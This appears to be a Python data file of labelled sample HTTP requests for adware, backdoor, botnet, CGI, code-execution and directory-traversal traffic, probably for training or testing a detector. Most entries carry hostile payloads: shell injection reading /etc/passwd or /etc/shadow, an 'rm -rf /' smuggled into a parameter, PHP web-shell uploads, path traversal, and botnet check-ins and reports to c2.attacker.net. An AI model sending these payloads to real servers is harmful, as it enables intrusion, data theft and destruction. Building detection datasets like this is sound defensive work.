adware = ["""
12.34.56.78
GET /ad?id=user12345&source=freegame HTTP/1.1
Host: adserver.malicious.net
User-Agent: my-adware-client/1.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
12.34.56.78
POST /inject_ads HTTP/1.1
Host: adnetwork.evil.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 55

{"user_id": "1a2b3c", "page_url": "https://legit-site.com"}
""",
"""
12.34.56.78
GET /images/new_ads/banner.jpg HTTP/1.1
Host: cdn-ad.badsite.co
User-Agent: Adware-Updater-Service/2.1
Accept: image/jpeg
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
12.34.56.78
GET /pop-up?ad_zone=sidebar&geo=us-ca&user_age=32 HTTP/1.1
Host: popad-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
12.34.56.78
GET /beacon?event=ad_shown&ad_id=987654 HTTP/1.1
Host: ad-tracker.evil.net
User-Agent: Ad-Injector-Client/1.2
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
12.34.56.78
GET /promoted_content.json HTTP/1.1
Host: widget-ads.com
User-Agent: DesktopWidget/3.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
12.34.56.78
POST /search_ads HTTP/1.1
Host: searchads.ad-partner.biz
User-Agent: FreeSearchUtility/1.5
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

query=how+to+cook+pasta
""",
"""
12.34.56.78
GET /video/fullscreen_ad.mp4 HTTP/1.1
Host: mobilead.media
User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; SM-G960U Build/QP1A.190711.020)
Accept: video/mp4
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
12.34.56.78
GET /rotate?ad_type=banner HTTP/1.1
Host: bannerfarm.net
User-Agent: my-ad-app/3.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
12.34.56.78
GET /ad_script.js HTTP/1.1
Host: script-server.bad-ad.biz
User-Agent: AdwareScriptLoader/1.1
Accept: application/javascript
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
    """192.168.1.10 GET /ads/banner1.js HTTP/1.1
Host: adserver1.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    """10.0.0.5 GET /track?uid=12345 HTTP/1.1
Host: tracker.ads.com
User-Agent: curl/7.68.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7
Accept-Language: en-US
Connection: close
""",
    """172.16.0.2 GET /popup?adid=789 HTTP/1.1
Host: popads.net
User-Agent: Wget/1.20.3
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: it-IT
Connection: keep-alive
""",
    """203.0.113.8 GET /redirect?url=http://malicious.com HTTP/1.1
Host: clicker.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: en-GB
Connection: keep-alive
""",
    """192.168.100.20 GET /banner?zone=top HTTP/1.1
Host: banners.adnet.com
User-Agent: python-requests/2.25.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
""",
    """10.10.10.10 GET /js/ad.js HTTP/1.1
Host: adinjector.com
User-Agent: PostmanRuntime/7.26.8
Accept: application/javascript
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    """172.16.1.1 GET /pixel.gif?track=1 HTTP/1.1
Host: pixel.tracker.com
User-Agent: Mozilla/5.0
Accept: image/gif
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: fr-FR
Connection: keep-alive
""",
    """192.0.2.1 GET /adsense?slot=footer HTTP/1.1
Host: adsense.fake
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: es-ES
Connection: close
""",
    """198.51.100.2 GET /adclick?banner=123 HTTP/1.1
Host: clicktracker.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: de-DE
Connection: keep-alive
""",
    """203.0.113.9 GET /popunder?ad=456 HTTP/1.1
Host: popunder.net
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    """192.168.1.11 GET /adframe?size=300x250 HTTP/1.1
Host: adframes.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    """10.0.0.6 GET /servead?type=video HTTP/1.1
Host: videoads.com
User-Agent: curl/7.80.0
Accept: video/mp4
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
""",
    """172.16.0.3 GET /ad.js?rnd=123456 HTTP/1.1
Host: jsads.net
User-Agent: Wget/1.21.1
Accept: application/javascript
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: it-IT
Connection: keep-alive
""",
    """203.0.113.10 GET /banner2.jpg HTTP/1.1
Host: imgads.com
User-Agent: Mozilla/5.0
Accept: image/jpeg
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: en-GB
Connection: keep-alive
""",
    """192.168.100.21 GET /adzone?cat=games HTTP/1.1
Host: adzone.com
User-Agent: python-requests/2.28.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
""",
    """10.10.10.11 GET /adtrack?event=impression HTTP/1.1
Host: adtrack.net
User-Agent: PostmanRuntime/7.29.0
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    """172.16.1.2 GET /ads/banner3.js HTTP/1.1
Host: adserver2.com
User-Agent: Mozilla/5.0
Accept: application/javascript
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: fr-FR
Connection: keep-alive
""",
    """192.0.2.2 GET /redirect?adid=999 HTTP/1.1
Host: redirectads.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: es-ES
Connection: close
""",
    """198.51.100.3 GET /ad?type=popup HTTP/1.1
Host: popad.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: de-DE
Connection: keep-alive
""",
    """203.0.113.10 GET /ads/banner4.js HTTP/1.1
Host: adserver3.com
User-Agent: Mozilla/5.0
Accept: application/javascript
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
"""]
backdoor = ["""
10.20.30.40
POST /api/stats HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

cmd=bHMtYWw=
""",
"""
10.20.30.40
GET /admin_api?password=secret_key&action=list_files HTTP/1.1
Host: webserver.example.com
User-Agent: curl/7.64.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /maintenance/api/run_script HTTP/1.1
Host: internal.company.net
User-Agent: Python-requests/2.22.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 30

{"command": "whoami"}
""",
"""
10.20.30.40
GET /images/logo.png HTTP/1.1
Host: legit-site.com
User-Agent: my-backdoor-client/1.0
Accept: image/png
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
"""]
botnet = ["""
98.76.54.32
POST /c2/checkin HTTP/1.1
Host: c2.attacker.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

botid=1a2b3c4d&status=ready&os=win10
""",
"""
98.76.54.32
POST /c2/report HTTP/1.1
Host: c2.attacker.net
User-Agent: botnet-client/2.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 150

{"botid":"1a2b3c4d","hostname":"win-pc-1","ip":"10.0.0.50","process_list":["chrome.exe","explorer.exe"]}
""",
"""
98.76.54.32
GET /c2/modules/ddos_module.bin HTTP/1.1
Host: c2.attacker.net
User-Agent: botnet-client/2.0
Accept: application/octet-stream
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Example 4: A bot receives a command to begin a DDoS attack against a target.[Server Response from C2 server to bot]
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"command":"ddos","target":"target.com","port":80,"method":"syn-flood"}
""",
"""
98.76.54.32
POST /login HTTP/1.1
Host: victim-login.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=admin&password=password1
""",
"""
98.76.54.32
GET /ad?id=12345&click=true HTTP/1.1
Host: ad-revenue-gen.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
98.76.54.32
POST /c2/vuln_report HTTP/1.1
Host: c2.attacker.net
User-Agent: botnet-client/2.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 80

{"botid":"1a2b3c4d","vuln":"SQLI","url":"http://testsite.com/view.php?id=1'"}
"""]
cgi = ["""
10.20.30.40
GET /cgi-bin/vulnerable.cgi?cmd=cat%20/etc/passwd HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /cgi-bin/test.cgi?path=`;whoami` HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /cgi-bin/display_file.cgi?filename=../../../../etc/shadow HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /cgi-bin/process_input.cgi HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

username=test;cat /etc/hosts > /tmp/out
""",
"""
10.20.30.40
GET /cgi-bin/ping.cgi?ip=8.8.8.8 HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /cgi-bin/download.cgi?file=../etc/passwd HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /cgi-bin/upload.cgi?file=payload.txt%00.jpg HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /cgi-bin/printer.cgi?doc=invoice%26%26rm%20-rf%20/ HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /cgi-bin/save_log.cgi HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

log_data=<?php system($_GET['cmd']); ?>
""",
"""
10.20.30.40
POST /cgi-bin/image_resize.cgi HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---boundary
Content-Length: 200

---boundary
Content-Disposition: form-data; name="file"; filename="malicious.gif"

GIF89a; <?php echo system('id'); ?>
---boundary--
"""]
codeexecution = ["""
10.20.30.40
POST /upload HTTP/1.1
Host: appserver.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Cookie: sessionid=abcdef12345
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---boundary
Content-Length: 154

---boundary
Content-Disposition: form-data; name="file"; filename="shell.php"

<?php system($_GET['cmd']); ?>
---boundary--
""",
"""
10.20.30.40
POST /api/settings HTTP/1.1
Host: appserver.example.com
User-Agent: Mozilla/5.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-java-serialized-object
Content-Length: 200
""",
"""
10.20.30.40
POST /log_error HTTP/1.1
Host: appserver.example.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

error_msg=%n%n%n%n%n%n%n%n
""",
"""
10.20.30.40
GET /ping?ip=127.0.0.1%3B%20whoami HTTP/1.1
Host: appserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /?id=%24%7B%24%7Bnew%20java.lang.String%28%27whoami%27%29%7D%7D HTTP/1.1
Host: appserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /calculator HTTP/1.1
Host: appserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

expression=1+1;system('id')
""",
"""
10.20.30.40
POST /resize_image HTTP/1.1
Host: appserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: image/png
Content-Length: 1000
""",
"""
10.20.30.40
GET /login?user=malicious_user%27%29%3Bsystem%28%27id%27%29%3B%2F%2F HTTP/1.1
Host: appserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /profile HTTP/1.1
Host: appserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Cookie: session=TzoxNjoicGhwX29iaGVjdF9kYXRhIjo1...
Connection: keep-alive
""",
"""
10.20.30.40
GET /greeting?name={{7*7}} HTTP/1.1
Host: appserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
    # Command injection via parametro GET
    """192.168.1.10 GET /run?cmd=ls%20-la;cat%20/etc/passwd HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
    # Command injection via POST
    """10.0.0.5 POST /admin HTTP/1.1
Host: testsite.com
User-Agent: curl/7.68.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7
Accept-Language: en-US
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

action=ping;uname -a
""",
    # PHP code injection
    """172.16.0.2 GET /vuln.php?eval=phpinfo(); HTTP/1.1
Host: vulnerable.com
User-Agent: Wget/1.20.3
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: it-IT,it;q=0.8
Connection: keep-alive
""",
    # Python code execution
    """203.0.113.8 GET /exec?code=__import__('os').system('id') HTTP/1.1
Host: webmail.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
""",
    # Ruby code execution
    """192.168.100.20 GET /run?cmd=`ls /` HTTP/1.1
Host: iotdevice.local
User-Agent: python-requests/2.25.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
""",
    # Node.js code execution
    """10.10.10.10 GET /api?input=require('child_process').execSync('ls') HTTP/1.1
Host: apisite.com
User-Agent: PostmanRuntime/7.26.8
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    # Bash injection
    """172.16.1.1 POST /cgi-bin/test.cgi HTTP/1.1
Host: mysite.org
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: fr-FR,fr;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=;cat /etc/shadow
""",
    # Perl code execution
    """192.0.2.1 GET /cgi-bin/perl.cgi?input=system('ls') HTTP/1.1
Host: demo.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: es-ES,es;q=0.8
Connection: close
""",
    # Java code execution
    """198.51.100.2 GET /run?code=Runtime.getRuntime().exec('ls') HTTP/1.1
Host: formsite.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: de-DE,de;q=0.8
Connection: keep-alive
""",
    # PowerShell injection
    """203.0.113.9 POST /powershell HTTP/1.1
Host: submit.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

command=Invoke-Expression('Get-Process')
""",
    # Command injection con pipe
    """192.168.1.11 GET /status?check=up|whoami HTTP/1.1
Host: admin.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    # PHP code execution con assert
    """10.0.0.6 GET /vuln.php?assert=system('ls') HTTP/1.1
Host: files.com
User-Agent: curl/7.80.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
""",
    # Node.js eval
    """172.16.0.3 GET /api?eval=process.mainModule.require('child_process').execSync('id') HTTP/1.1
Host: corp.com
User-Agent: Wget/1.21.1
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: it-IT
Connection: keep-alive
""",
    # Bash injection con backtick
    """203.0.113.10 POST /cgi-bin/test.cgi HTTP/1.1
Host: download.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: en-GB
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=`cat /etc/passwd`
""",
    # Python exec
    """192.168.100.21 GET /exec?input=exec('import os;os.system(\"ls\")') HTTP/1.1
Host: iot2.local
User-Agent: python-requests/2.28.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
""",
    # Ruby eval
    """10.10.10.11 GET /run?eval=eval('`ls`') HTTP/1.1
Host: apisite2.com
User-Agent: PostmanRuntime/7.29.0
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    # JavaScript injection in Node.js
    """172.16.1.2 GET /api?js=eval('require(\"child_process\").execSync(\"ls\")') HTTP/1.1
Host: shellsite.org
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: fr-FR
Connection: keep-alive
""",
    # Perl injection
    """192.0.2.2 GET /cgi-bin/perl.cgi?input=qx(ls) HTTP/1.1
Host: demo2.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: es-ES
Connection: close
""",
    # Windows command injection
    """198.51.100.3 GET /run?cmd=dir%20C:\\ HTTP/1.1
Host: formsite2.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: de-DE
Connection: keep-alive
""",
    # Bash injection con && 
    """203.0.113.10 GET /cgi-bin/test.cgi?input=foo&&cat%20/etc/shadow HTTP/1.1
Host: submit2.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
"""]
directorytraversal = ["""
10.20.30.40
GET /showimage.php?file=../../../../etc/passwd HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /download.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /view_report HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

report_name=../../etc/passwd
""",
"""
10.20.30.40
GET /image.php?path=../../../windows/win.ini%00.jpg HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: image/jpeg
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /user_profile HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Cookie: profile_image=../../../etc/passwd
Connection: keep-alive
""",
"""
10.20.30.40
GET /view_log?file=../../var/log/apache2/access.log HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /upload_config HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

file=../../etc/hosts&data=127.0.0.1
""",
"""
10.20.30.40
GET /data HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
X-File-Path: ../../../etc/fstab
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /view_template.jsp?template=foo/../../../../etc/passwd HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /view.php?file=..%2f..%2f..%2f..%2fetc%2fpAsswd HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
    """192.168.1.10 GET /../../etc/passwd HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
